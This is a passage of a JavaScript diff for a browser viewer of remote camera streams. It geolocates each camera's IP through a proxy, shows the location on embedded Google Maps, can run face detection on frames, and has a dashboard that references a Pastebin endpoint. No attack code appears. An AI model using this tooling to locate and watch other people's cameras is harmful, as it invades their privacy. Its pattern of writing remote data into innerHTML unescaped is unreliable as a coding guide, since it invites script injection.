+                tabContent.classList.add('active');
+            }
+        });
+    });
+};
+
+// Make window resizable (simplified version that doesn't change resolution)
+const makeResizable = (windowElement) => {
+    if (!windowElement) return;
+
+    // Create resize handles if not already present
+    const handles = ['se', 'sw', 'ne', 'nw', 'n', 's', 'e', 'w'];
+
+    handles.forEach(direction => {
+        const handleClass = `resize-handle resize-${direction}`;
+        if (!windowElement.querySelector(`.${handleClass.split(' ')[1]}`)) {
+            const handle = document.createElement('div');
+            handle.className = handleClass;
+            windowElement.appendChild(handle);
+
+            // Setup resize event handling
+            handle.addEventListener('mousedown', (e) => {
+                e.preventDefault();
+                startResize(e, windowElement, direction);
+            });
+        }
+    });
+};
+
+// Start resize function (simplified)
+const startResize = (e, windowElement, direction) => {
+    e.stopPropagation();
+
+    const startX = e.clientX;
+    const startY = e.clientY;
+    const startWidth = windowElement.offsetWidth;
+    const startHeight = windowElement.offsetHeight;
+    const startTop = windowElement.offsetTop;
+    const startLeft = windowElement.offsetLeft;
+
+    const minWidth = 320;
+    const minHeight = 240;
+
+    // Resize function
+    const resize = (e) => {
+        // Bring window to front
+        const highestZIndex = Math.max(
+            ...Array.from(document.querySelectorAll('.window'))
+                .map(w => parseInt(getComputedStyle(w).zIndex) || 0)
+        );
+        windowElement.style.zIndex = highestZIndex + 1;
+
+        // Calculate new dimensions based on direction
+        let newWidth = startWidth;
+        let newHeight = startHeight;
+        let newTop = startTop;
+        let newLeft = startLeft;
+
+        const deltaX = e.clientX - startX;
+        const deltaY = e.clientY - startY;
+
+        if (direction.includes('e')) newWidth = Math.max(minWidth, startWidth + deltaX);
+        if (direction.includes('s')) newHeight = Math.max(minHeight, startHeight + deltaY);
+        if (direction.includes('w')) {
+            newWidth = Math.max(minWidth, startWidth - deltaX);
+            newLeft = startLeft + startWidth - newWidth;
+        }
+        if (direction.includes('n')) {
+            newHeight = Math.max(minHeight, startHeight - deltaY);
+            newTop = startTop + startHeight - newHeight;
+        }
+
+        // Apply new dimensions
+        windowElement.style.width = `${newWidth}px`;
+        windowElement.style.height = `${newHeight}px`;
+        windowElement.style.top = `${newTop}px`;
+        windowElement.style.left = `${newLeft}px`;
+    };
+
+    // Finish resize function
+    const stopResize = () => {
+        window.removeEventListener('mousemove', resize);
+        window.removeEventListener('mouseup', stopResize);
+    };
+
+    // Add event listeners
+    window.addEventListener('mousemove', resize);
+    window.addEventListener('mouseup', stopResize);
+};
+
+// IP Information
+async function fetchIPInfo(ip, windowElement) {
+    if (!ip || !windowElement) return;
+
+    const windowId = windowElement.dataset.id;
+    if (!windowId) return;
+
+    // Set loading indicator
+    const ipInfoContainer = windowElement.querySelector('#ipInfoContainer');
+    if (ipInfoContainer) {
+        ipInfoContainer.innerHTML = '<div class="loading"><i class="fas fa-circle-notch fa-spin"></i> Loading IP information...</div>';
+    }
+
+    // Safety timeout to prevent infinite loading
+    const loadingTimeout = setTimeout(() => {
+        if (ipInfoContainer) {
+            ipInfoContainer.innerHTML = '<div class="error-message"><i class="fas fa-exclamation-triangle"></i> Error: IP info request timed out.</div>';
+        }
+    }, 15000);
+
+    try {
+        // Use CORS proxy to fetch IP info
+        const ipInfoUrl = `${API_ENDPOINTS.IP_INFO}${ip}?fields=${API_ENDPOINTS.IP_INFO_FIELDS}`;
+        console.log(`Fetching IP info using proxy from: ${ipInfoUrl}`);
+
+        // Use fetch with a timeout
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+
+        const response = await fetch(API_ENDPOINTS.CORS_PROXY, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ url: ipInfoUrl }),
+            signal: controller.signal
+        });
+
+        clearTimeout(timeoutId); // Clear fetch timeout
+
+        if (!response.ok) {
+            const errorMessage = await response.text();
+            throw new Error(`HTTP error! Status: ${response.status}, Message: ${errorMessage}`);
+        }
+
+        const proxyResponse = await response.json();
+
+        if (!proxyResponse || !proxyResponse.contents) {
+            throw new Error('Invalid response from proxy server');
+        }
+
+        // Parse the contents from the proxy response
+        const ipData = JSON.parse(proxyResponse.contents);
+
+        if (!ipData || !ipData.query) {
+            throw new Error('Invalid IP data structure');
+        }
+
+        // Clear safety timeout since we got data
+        clearTimeout(loadingTimeout);
+
+        // Store raw data for advanced mode
+        globalState.rawData.ipInfo[windowId] = ipData;
+
+        // Update the raw IP data in the settings tab
+        const rawIpContainer = windowElement.querySelector('.raw-ip-data');
+        if (rawIpContainer) {
+            rawIpContainer.textContent = JSON.stringify(ipData, null, 2);
+        }
+
+        // Update UI with data
+        updateIPInfoUI(ipData, windowElement);
+
+        // Fetch ASN info if available
+        if (ipData.query) {
+            fetchAndUpdateASN(ipData.query, windowElement);
+        }
+
+        // Update dashboard if in advanced mode
+        if (globalState.advancedMode) {
+            updateDashboardContent();
+            if (globalState.currentSelectedCamera === windowId) {
+                updateCurrentIpDisplay();
+            }
+        }
+
+    } catch (error) {
+        console.error('Error fetching IP info:', error);
+
+        // Clear safety timeout since we got an error
+        clearTimeout(loadingTimeout);
+
+        // Update UI with error
+        if (ipInfoContainer) {
+            ipInfoContainer.innerHTML = `
+                <div class="error-message">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <p>Error fetching IP information: ${error.message || 'Unknown error'}</p>
+                </div>
+            `;
+        }
+    }
+}
+
+// ASN Information
+async function fetchAndUpdateASN(ip, windowElement) {
+    if (!ip || !windowElement) return;
+
+    const windowId = windowElement.dataset.id;
+    if (!windowId) return;
+
+    try {
+        // Use CORS proxy for ASN info too
+        const asnUrl = `${API_ENDPOINTS.ASN_INFO}${ip}/json`;
+        console.log(`Fetching ASN info using proxy from: ${asnUrl}`);
+
+        // Use fetch with a timeout
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+
+        const response = await fetch(API_ENDPOINTS.CORS_PROXY, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ url: asnUrl }),
+            signal: controller.signal
+        });
+
+        clearTimeout(timeoutId); // Clear fetch timeout
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+
+        const proxyResponse = await response.json();
+
+        if (!proxyResponse || !proxyResponse.contents) {
+            throw new Error('Invalid response from proxy server');
+        }
+
+        // Parse the contents from the proxy response
+        const asnData = JSON.parse(proxyResponse.contents);
+
+        // Store raw ASN data for advanced mode
+        globalState.rawData.asnInfo[windowId] = asnData;
+
+        // Update the raw ASN data in the settings tab
+        const rawAsnContainer = windowElement.querySelector('.raw-asn-data');
+        if (rawAsnContainer) {
+            rawAsnContainer.textContent = JSON.stringify(asnData, null, 2);
+        }
+
+        // We don't need a dedicated ASN display in the info view, as the main IP info already includes ASN
+        // But update dashboard if in advanced mode
+        if (globalState.advancedMode) {
+            updateDashboardContent();
+            if (globalState.currentSelectedCamera === windowId) {
+                updateCurrentIpDisplay();
+            }
+        }
+    } catch (error) {
+        console.error('Error fetching ASN info:', error);
+        // Just log the error but don't display it as the IP info is still valuable
+    }
+}
+
+// Update IP Info UI
+const updateIPInfoUI = (data, windowElement) => {
+    if (!data || !windowElement) return;
+
+    // Get window ID
+    const windowId = windowElement.dataset.id;
+    if (!windowId) return;
+
+    // Update window title with location
+    const titleElement = windowElement.querySelector('.window-title');
+    if (titleElement && data.city && data.country) {
+        titleElement.textContent = `${data.city}, ${data.country}`;
+    }
+
+    // Update specific UI content - target the correct element with ID
+    const ipInfoContainer = windowElement.querySelector('#ipInfoContainer');
+
+    if (ipInfoContainer) {
+        const threatStatus = data.proxy || data.hosting;
+        const securityClass = threatStatus ? 'security-alert' : 'security-safe';
+
+        ipInfoContainer.innerHTML = `
+            <div class="ip-header">
+                <div class="location-name">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>${data.city || 'Unknown'}, ${data.regionName || ''}, ${data.country || 'Unknown'}</span>
+                </div>
+                <div class="ip-address">
+                    <i class="fas fa-network-wired"></i>
+                    <span>${data.query || 'Unknown IP'}</span>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h3><i class="fas fa-globe"></i> Location</h3>
+                <div class="info-row">
+                    <span class="info-label">City:</span>
+                    <span class="info-value">${data.city || 'Unknown'}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Region:</span>
+                    <span class="info-value">${data.regionName || 'Unknown'}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Country:</span>
+                    <span class="info-value">${data.country || 'Unknown'} ${data.countryCode ? `(${data.countryCode})` : ''}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Timezone:</span>
+                    <span class="info-value">${data.timezone || 'Unknown'}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Coordinates:</span>
+                    <span class="info-value">${data.lat ? data.lat.toFixed(4) : '?'}, ${data.lon ? data.lon.toFixed(4) : '?'}</span>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h3><i class="fas fa-server"></i> Network</h3>
+                <div class="info-row">
+                    <span class="info-label">ISP:</span>
+                    <span class="info-value">${data.isp || 'Unknown'}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Organization:</span>
+                    <span class="info-value">${data.org || 'Unknown'}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">AS:</span>
+                    <span class="info-value">${data.as || 'Unknown'}</span>
+                </div>
+                <div class="info-row ${securityClass}">
+                    <span class="info-label">Security:</span>
+                    <span class="info-value">
+                        ${threatStatus ? 'Potentially Unsafe' : 'Normal'}
+                        ${data.proxy ? '<i class="fas fa-shield-alt"></i> Proxy' : ''}
+                        ${data.hosting ? '<i class="fas fa-server"></i> Hosting' : ''}
+                        ${data.mobile ? '<i class="fas fa-mobile-alt"></i> Mobile' : ''}
+                    </span>
+                </div>
+            </div>
+        `;
+    }
+
+    // Update map section
+    const mapContainer = windowElement.querySelector('#camera-location');
+    if (mapContainer && data.lat && data.lon) {
+        // Embed Google Maps with the location
+        mapContainer.innerHTML = `
+            <div class="map-container">
+                <iframe width="100%" height="100%" frameborder="0" style="border:0"
+                    src="https://maps.google.com/maps?width=100%&amp;height=600&amp;hl=en&amp;coord=${data.lat},${data.lon}&amp;q=1%20${data.district || ''}%20Street%2C%20${data.city || ''}%2C%20${data.regionName || ''}&amp;ie=UTF8&amp;t=&amp;z=14&amp;iwloc=B&amp;output=embed"
+                    allowfullscreen>
+                </iframe>
+            </div>
+        `;
+    } else if (mapContainer) {
+        mapContainer.innerHTML = '<div class="map-placeholder">Map data not available</div>';
+    }
+
+    // If in advanced mode, update the dashboard content
+    if (globalState.advancedMode) {
+        updateDashboardContent();
+
+        // If this is the selected camera in the dashboard, update its display
+        if (globalState.currentSelectedCamera === windowId) {
+            updateCurrentIpDisplay();
+        }
+    }
+};
+
+// Update Google Maps
+const updateGoogleMaps = (lat, lon, district, city, regionName, windowElement) => {
+    if (!lat || !lon || !windowElement) return;
+
+    const mapContainer = windowElement.querySelector('#camera-location');
+    if (!mapContainer) return;
+
+    // Add Google Maps iframe
+    const locationName = [district, city, regionName].filter(Boolean).join(', ');
+
+    mapContainer.innerHTML = `
+        <iframe width="100%" height="100%" frameborder="0" style="border:0"
+            src="https://maps.google.com/maps?width=100%&amp;height=600&amp;hl=en&amp;coord=${lat},${lon}&amp;q=1%20${district}%20Street%2C%20${city}%2C%20${regionName}&amp;ie=UTF8&amp;t=&amp;z=14&amp;iwloc=B&amp;output=embed"
+            allowfullscreen>
+        </iframe>
+    `;
+};
+
+// Face Detection (if using face-api.js)
+const initFaceDetection = async (imageElement, overlayElement) => {
+    if (!imageElement || !overlayElement || !window.faceapi) return;
+
+    try {
+        // Wait for face-api.js models to load
+        await Promise.all([
+            faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
+            faceapi.nets.faceLandmark68Net.loadFromUri('/models'),
+            faceapi.nets.faceRecognitionNet.loadFromUri('/models')
+        ]);
+
+        // Set up face detection interval
+        const interval = setInterval(async () => {
+            // Check if toggle is on
+            const toggle = document.getElementById('faceDetectionToggle');
+            if (!toggle || !toggle.checked) {
+                overlayElement.innerHTML = '';
+        return;
+    }
+
+            // Check if elements still exist
+            if (!document.body.contains(imageElement) || !document.body.contains(overlayElement)) {
+                clearInterval(interval);
+                return;
+            }
+
+            try {
+                // Detect faces
+                const detections = await faceapi.detectAllFaces(
+                    imageElement,
+                    new faceapi.TinyFaceDetectorOptions()
+                );
+
+                // Clear previous detections
+                overlayElement.innerHTML = '';
+
+                // Draw face boxes
+                detections.forEach(detection => {
+                    const { x, y, width, height } = detection.box;
+
+                    const faceBox = document.createElement('div');
+                    faceBox.className = 'face-detection-box';
+                    faceBox.style.left = `${x}px`;
+                    faceBox.style.top = `${y}px`;
+                    faceBox.style.width = `${width}px`;
+                    faceBox.style.height = `${height}px`;
+
+                    overlayElement.appendChild(faceBox);
+                });
+            } catch (error) {
+                console.error('Face detection error:', error);
+            }
+        }, 2000);
+    } catch (error) {
+        console.error('Error initializing face detection:', error);
+    }
+};
+
+// Advanced Dashboard Functions
+const openAdvancedDashboard = () => {
+    // Check if dashboard is already open
+    if (document.getElementById('advancedDashboard')) {
+        return;
+    }
+
+    globalState.advancedMode = true;
+
+    // Create dashboard from template
+    const template = document.getElementById('advancedDashboardTemplate');
+    const dashboard = template.content.cloneNode(true).querySelector('.advanced-dashboard');
+
+    // Calculate position (center of screen)
+    const windowWidth = window.innerWidth;
+    const windowHeight = window.innerHeight;
+    dashboard.style.top = `${(windowHeight - 600) / 2}px`;
+    dashboard.style.left = `${(windowWidth - 900) / 2}px`;
+
+    // Make draggable
+    document.body.appendChild(dashboard);
+    makeDraggable(dashboard, dashboard.querySelector('.window-titlebar'));
+
+    // Setup window controls
+    setupWindowControls(dashboard);
+
+    // Setup dashboard functionality
+    setupDashboardNavigation(dashboard);
+
+    // Initialize dashboard content
+    updateDashboardContent();
+
+    // Setup current IP functionality
+    setupCurrentIPFunctionality();
+
+    // Update dashboard time
+    updateAdvancedModeTime();
+    setInterval(updateAdvancedModeTime, 1000);
+
+    // Set Current IP as the active section by default
+    const currentIpNavItem = dashboard.querySelector('.nav-item[data-section="current-ip"]');
+    const apiEndpointsNavItem = dashboard.querySelector('.nav-item[data-section="api-endpoints"]');
+
+    if (currentIpNavItem && apiEndpointsNavItem) {
+        // Remove active class from API Endpoints
+        apiEndpointsNavItem.classList.remove('active');
+        dashboard.querySelector('#api-endpoints').classList.remove('active');
+
+        // Add active class to Current IP
+        currentIpNavItem.classList.add('active');
+        dashboard.querySelector('#current-ip').classList.add('active');
+    }
+};
+
+const closeAdvancedDashboard = () => {
+    const dashboard = document.getElementById('advancedDashboard');
+    if (dashboard) {
+        dashboard.classList.add('closing');
+        setTimeout(() => {
+            dashboard.remove();
+            globalState.advancedMode = false;
+        }, 300);
+    }
+};
+
+const setupDashboardNavigation = (dashboard) => {
+    const navItems = dashboard.querySelectorAll('.nav-item');
+
+    navItems.forEach(item => {
+        item.addEventListener('click', () => {
+            // Remove active class from all items
+            navItems.forEach(nav => nav.classList.remove('active'));
+
+            // Add active class to clicked item
+            item.classList.add('active');
+
+            // Show corresponding section
+            const sectionId = item.dataset.section;
+            const sections = dashboard.querySelectorAll('.dashboard-section');
+            sections.forEach(section => section.classList.remove('active'));
+
+            const activeSection = dashboard.querySelector(`#${sectionId}`);
+            if (activeSection) {
+                activeSection.classList.add('active');
+            }
+        });
+    });
+};
+
+const updateDashboardContent = () => {
+    // Update API endpoints information
+    updateApiEndpointsSection();
+
+    // Update state information
+    updateStateSection();
+
+    // Update camera data
+    updateCameraDataSection();
+
+    // Update current IP selector
+    populateCurrentIpSelector();
+
+    // Update current IP display
+    updateCurrentIpDisplay();
+};
+
+const updateApiEndpointsSection = () => {
+    const ipInfoEndpoint = document.getElementById('ipInfoEndpoint');
+    if (ipInfoEndpoint) {
+        ipInfoEndpoint.textContent = `${API_ENDPOINTS.IP_INFO}{ip}?fields=${API_ENDPOINTS.IP_INFO_FIELDS}`;
+    }
+
+    const asnInfoEndpoint = document.getElementById('asnInfoEndpoint');
+    if (asnInfoEndpoint) {
+        asnInfoEndpoint.textContent = `${API_ENDPOINTS.ASN_INFO}{asn}/json`;
+    }
+
+    const pastebinEndpoint = document.getElementById('pastebinEndpoint');
+    if (pastebinEndpoint) {
+        pastebinEndpoint.textContent = API_ENDPOINTS.PASTEBIN;
+    }
+};
+
+const updateStateSection = () => {
+    const stateView = document.getElementById('globalStateView');
+    if (stateView) {
+        // Create a copy of the state to display, but filter out large datasets
+        const displayState = { ...globalState };
+
+        // Don't show the full console log history
+        if (displayState.consoleLog && displayState.consoleLog.length > 0) {
+            displayState.consoleLog = `[Array(${displayState.consoleLog.length} items)]`;
+        }
+
+        stateView.textContent = JSON.stringify(displayState, null, 2);
+    }
+};
+
+const updateCameraDataSection = () => {
+    const cameraDataList = document.getElementById('camerasDataList');
+    if (!cameraDataList) return;
+
+    // Clear previous content
+    cameraDataList.innerHTML = '';
+
+    // Add data for each active window
+    globalState.activeWindows.forEach(windowId => {
+        const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+        if (!windowElement) return;
+
+        const streamUrl = windowElement.dataset.streamUrl;
+        const ipInfo = globalState.rawData.ipInfo[windowId];
+        const asnInfo = globalState.rawData.asnInfo[windowId];
+
+        const card = document.createElement('div');
+        card.className = 'camera-data-card';
+
+        let cardContent = `
+            <div class="camera-data-header">
+                <i class="fas fa-video"></i>
+                <h4>${streamUrl || 'Unknown URL'}</h4>
+            </div>
+            <div class="camera-data-content">
+        `;
+
+        if (ipInfo) {
+            cardContent += `
+                <div class="data-pair">
+                    <span class="data-label">IP:</span>
+                    <span class="data-value">${ipInfo.query || 'Unknown'}</span>
+                </div>
+                <div class="data-pair">
+                    <span class="data-label">Location:</span>
+                    <span class="data-value">${ipInfo.city || 'Unknown'}, ${ipInfo.country || ''}</span>
+                </div>
+                <div class="data-pair">
+                    <span class="data-label">ASN:</span>
+                    <span class="data-value">${ipInfo.as || 'Unknown'}</span>
+                </div>
+            `;
+        } else {
+            cardContent += `<p>No IP data available</p>`;
+        }
+
+        cardContent += '</div>';
+        card.innerHTML = cardContent;
+        cameraDataList.appendChild(card);
+    });
+
+    // If no cameras, show a message
+    if (globalState.activeWindows.length === 0) {
+        cameraDataList.innerHTML = '<p>No active cameras to display</p>';
+    }
+};
+
+const updateConsoleOutput = () => {
+    const consoleOutput = document.getElementById('consoleOutput');
+    if (!consoleOutput) return;
+
+    consoleOutput.innerHTML = '';
+
+    // Display the last 50 console entries
+    const lastEntries = globalState.consoleLog.slice(-50);
+
+    lastEntries.forEach(entry => {
+        const line = document.createElement('div');
+        line.className = 'console-line';
+
+        const time = document.createElement('span');
+        time.className = 'console-time';
+        time.textContent = `[${entry.time.toLocaleTimeString()}]`;
+
+        const type = document.createElement('span');
+        type.className = `console-type ${entry.type}`;
+        type.textContent = entry.type.toUpperCase();
+
+        const message = document.createElement('span');
+        message.className = 'console-message';
+        message.textContent = entry.message;
+
+        line.appendChild(time);
+        line.appendChild(type);
+        line.appendChild(message);
+
+        consoleOutput.appendChild(line);
+    });
+
+    // Auto-scroll to bottom
+    consoleOutput.scrollTop = consoleOutput.scrollHeight;
+};
+
+const updateAdvancedModeTime = () => {
+    const timeElement = document.getElementById('advancedModeTime');
+    if (timeElement) {
+        const now = new Date();
+        timeElement.textContent = now.toLocaleTimeString();
+    }
+};
+
+// Current IP functions
+const populateCurrentIpSelector = () => {
+    const selector = document.getElementById('currentIpSelector');
+    if (!selector) return;
+
+    // Get the currently selected value if any
+    const currentValue = selector.value;
+
+    // Clear existing options, keeping only the default one
+    selector.innerHTML = '<option value="">Select a camera...</option>';
+
+    // Add each active camera
+    globalState.activeWindows.forEach(windowId => {
+        const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+        if (!windowElement) return;
+
+        const streamUrl = windowElement.dataset.streamUrl;
+        if (!streamUrl) return;
+
+        const option = document.createElement('option');
+        option.value = windowId;
+        option.textContent = streamUrl;
+
+        // Check if this was the previously selected one
+        if (windowId === currentValue) {
+            option.selected = true;
+        }
+
+        selector.appendChild(option);
+    });
+
+    // If nothing is selected but there are cameras, select the first one
+    if (!selector.value && globalState.activeWindows.length > 0) {
+        selector.value = globalState.activeWindows[0];
+    }
+
+    // Trigger change event to update display
+    if (selector.value) {
+        globalState.currentSelectedCamera = selector.value;
+        updateCurrentIpDisplay();
+    }
+};
+
+const updateCurrentIpDisplay = () => {
+    const windowId = globalState.currentSelectedCamera;
+    if (!windowId) return;
+
+    const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+    if (!windowElement) return;
+
+    const streamUrl = windowElement.dataset.streamUrl;
+    const ipData = globalState.rawData.ipInfo[windowId];
+    const asnData = globalState.rawData.asnInfo[windowId];
+
+    // Update IP address display
+    const ipAddressElement = document.getElementById('currentIpAddress');
+    if (ipAddressElement) {
+        ipAddressElement.textContent = ipData ? ipData.query : extractIpFromUrl(streamUrl) || 'Unknown IP';
+    }
+
+    // Update location display
+    const locationElement = document.getElementById('currentIpLocation');
+    if (locationElement && ipData) {
+        locationElement.textContent = `${ipData.city || ''}, ${ipData.regionName || ''}, ${ipData.country || ''}`;
+    } else if (locationElement) {
+        locationElement.textContent = '';
+    }
+
+    // Update network details
+    const networkElement = document.getElementById('currentIpNetwork');
+    if (networkElement && ipData) {
+        networkElement.innerHTML = `
+            <div class="detail-row">
+                <span class="detail-label">ISP:</span>
+                <span class="detail-value">${ipData.isp || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Org:</span>
+                <span class="detail-value">${ipData.org || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">AS:</span>
+                <span class="detail-value">${ipData.as || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Mobile:</span>
+                <span class="detail-value">${ipData.mobile ? 'Yes' : 'No'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Proxy:</span>
+                <span class="detail-value">${ipData.proxy ? 'Yes' : 'No'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Hosting:</span>
+                <span class="detail-value">${ipData.hosting ? 'Yes' : 'No'}</span>
+            </div>
+        `;
+    } else if (networkElement) {
+        networkElement.innerHTML = '<p>No network data available</p>';
+    }
+
+    // Update location details
+    const locationDetailsElement = document.getElementById('currentIpLocationDetails');
+    if (locationDetailsElement && ipData) {
+        locationDetailsElement.innerHTML = `
+            <div class="detail-row">
+                <span class="detail-label">City:</span>
+                <span class="detail-value">${ipData.city || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Region:</span>
+                <span class="detail-value">${ipData.regionName || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Country:</span>
+                <span class="detail-value">${ipData.country || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Continent:</span>
+                <span class="detail-value">${ipData.continent || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Timezone:</span>
+                <span class="detail-value">${ipData.timezone || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Lat/Long:</span>
+                <span class="detail-value">${ipData.lat || '?'}, ${ipData.lon || '?'}</span>
+            </div>
+        `;
+    } else if (locationDetailsElement) {
+        locationDetailsElement.innerHTML = '<p>No location data available</p>';
+    }
+
+    // Update ASN details
+    const asnElement = document.getElementById('currentIpAsn');
+    if (asnElement && asnData) {
+        asnElement.innerHTML = `
+            <div class="detail-row">
+                <span class="detail-label">ASN:</span>
+                <span class="detail-value">${ipData?.as || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">ASN Name:</span>
+                <span class="detail-value">${ipData?.asname || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Hostname:</span>
+                <span class="detail-value">${asnData?.hostname || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Company:</span>
+                <span class="detail-value">${asnData?.org || 'Unknown'}</span>
+            </div>
+        `;
+    } else if (asnElement) {
+        asnElement.innerHTML = '<p>No ASN data available</p>';
+    }
+
+    // Update stream details
+    const streamDetailsElement = document.getElementById('currentIpStreamDetails');
+    if (streamDetailsElement) {
+        streamDetailsElement.innerHTML = `
+            <div class="detail-row">
+                <span class="detail-label">URL:</span>
+                <span class="detail-value">${streamUrl || 'Unknown'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Type:</span>
+                <span class="detail-value">${streamUrl?.startsWith('rtsp://') ? 'RTSP' : 'MJPG'}</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Resolution:</span>
+                <span class="detail-value">${windowElement.querySelector('.stream-resolution')?.textContent || 'Unknown'}</span>
+            </div>
+        `;
+    }
+
+    // Update map
+    const mapElement = document.getElementById('currentIpMap');
+    if (mapElement && ipData && ipData.lat && ipData.lon) {
+        mapElement.innerHTML = `
+            <iframe width="100%" height="100%" frameborder="0" style="border:0"
+            src="https://maps.google.com/maps?width=100%&amp;height=600&amp;hl=en&amp;coord=${ipData.lat},${ipData.lon}&amp;q=1%20${ipData.district || ''}%20Street%2C%20${ipData.city || ''}%2C%20${ipData.regionName || ''}&amp;ie=UTF8&amp;t=&amp;z=14&amp;iwloc=B&amp;output=embed"
+            allowfullscreen></iframe>
+        `;
+    } else if (mapElement) {
+        mapElement.innerHTML = '<p>Map data not available</p>';
+    }
+};
+
+const setupResolutionControls = () => {
+    const autoResolutionToggle = document.getElementById('autoResolutionGlobal');
+    const manualControls = document.getElementById('manualResolutionControls');
+    const resolutionSelect = document.getElementById('manualResolution');
+    const applyButton = document.getElementById('applyResolution');
+
+    if (autoResolutionToggle) {
+        // Set initial state
+        autoResolutionToggle.checked = globalState.autoResolution;
+        manualControls.style.display = globalState.autoResolution ? 'none' : 'flex';
+
+        // Listen for changes
+        autoResolutionToggle.addEventListener('change', (e) => {
+            globalState.autoResolution = e.target.checked;
+            manualControls.style.display = globalState.autoResolution ? 'none' : 'flex';
+
+            // If auto resolution is turned on, update all active windows
+            if (globalState.autoResolution) {
+                globalState.activeWindows.forEach(windowId => {
+                    const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+                    if (windowElement) {
+                        const videoContainer = windowElement.querySelector('.video-container');
+                        const streamUrl = windowElement.dataset.streamUrl;
+
+                        if (streamUrl?.startsWith('rtsp://') && videoContainer) {
+                            const newResolution = calculateOptimalResolution(
+                                videoContainer.clientWidth,
+                                videoContainer.clientHeight
+                            );
+
+                            updateRtspStreamResolution(windowElement, streamUrl, newResolution);
+                        }
+                    }
+                });
+            }
+        });
+    }
+
+    if (resolutionSelect) {
+        // Set initial selected value
+        const options = resolutionSelect.querySelectorAll('option');
+        for (const option of options) {
+            if (option.value === globalState.manualResolution) {
+                option.selected = true;
+                break;
+            }
+        }
+    }
+
+    if (applyButton) {
+        applyButton.addEventListener('click', () => {
+            if (!resolutionSelect || !resolutionSelect.value) return;
+
+            globalState.manualResolution = resolutionSelect.value;
+
+            // Apply to all active RTSP windows
+            globalState.activeWindows.forEach(windowId => {
+                const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+                if (windowElement) {
+                    const streamUrl = windowElement.dataset.streamUrl;
+
+                    if (streamUrl?.startsWith('rtsp://')) {
+                        updateRtspStreamResolution(windowElement, streamUrl, globalState.manualResolution);
+        }
+    }
+});
+
+            // Update the current selected camera display
+            updateCurrentIpDisplay();
+        });
+    }
+};
+
+// Resolution Functions
+const calculateOptimalResolution = (containerWidth, containerHeight) => {
+    // Ensure minimum dimensions
+    const width = Math.max(containerWidth, 320);
+    const height = Math.max(containerHeight, 240);
+
+    // Round to nearest multiple of 16 for efficient encoding
+    const roundedWidth = Math.round(width / 16) * 16;
+    const roundedHeight = Math.round(height / 16) * 16;
+
+    return `${roundedWidth}x${roundedHeight}`;
+};
+
+const updateRtspStreamResolution = (windowElement, streamUrl, resolution) => {
+    if (!windowElement || !streamUrl || !resolution) return;
+
+    const videoContainer = windowElement.querySelector('.video-container');
+    if (!videoContainer) return;
+
+    const iframe = videoContainer.querySelector('iframe');
+    if (!iframe) return;
+
+    // Get the current player type
+    const playerSelect = windowElement.querySelector('.player-select');
+    const currentPlayer = playerSelect ? playerSelect.value : globalState.playerPreference;
+
+    // Create new player with updated settings
+    const newPlayer = currentPlayer === 'streamedian'
+        ? createStreamedianPlayer(streamUrl, resolution)
+        : createFlashphonerPlayer(streamUrl);
+
+    // Replace the existing player
+    iframe.replaceWith(newPlayer);
+
+    // Update resolution in status bar
+    const statusResolution = windowElement.querySelector('.stream-resolution');
+    if (statusResolution) {
+        statusResolution.textContent = resolution;
+    }
+};
+
+const setupResizeObserver = (windowElement, videoContainer, url) => {
+    if (!windowElement || !videoContainer || !url) return;
+
+    const windowId = windowElement.dataset.id;
+    if (!windowId) return;
+
+    // Clean up existing observer and timeout if they exist
+    if (globalState.resizeObservers[windowId]) {
+        globalState.resizeObservers[windowId].observer.disconnect();
+        if (globalState.resizeObservers[windowId].timeout) {
+            clearTimeout(globalState.resizeObservers[windowId].timeout);
+        }
+        delete globalState.resizeObservers[windowId];
+    }
+
+    // Create new observer
+    const observer = new ResizeObserver(entries => {
+        // Only update if auto resolution is enabled
+        if (!globalState.autoResolution) return;
+
+        // Clear existing timeout
+        if (globalState.resizeObservers[windowId]?.timeout) {
+            clearTimeout(globalState.resizeObservers[windowId].timeout);
+        }
+
+        // Debounce to avoid too many updates
+        const timeout = setTimeout(() => {
+            if (!document.body.contains(windowElement)) {
+                // Clean up if window was removed
+                observer.disconnect();
+                delete globalState.resizeObservers[windowId];
+                return;
+            }
+
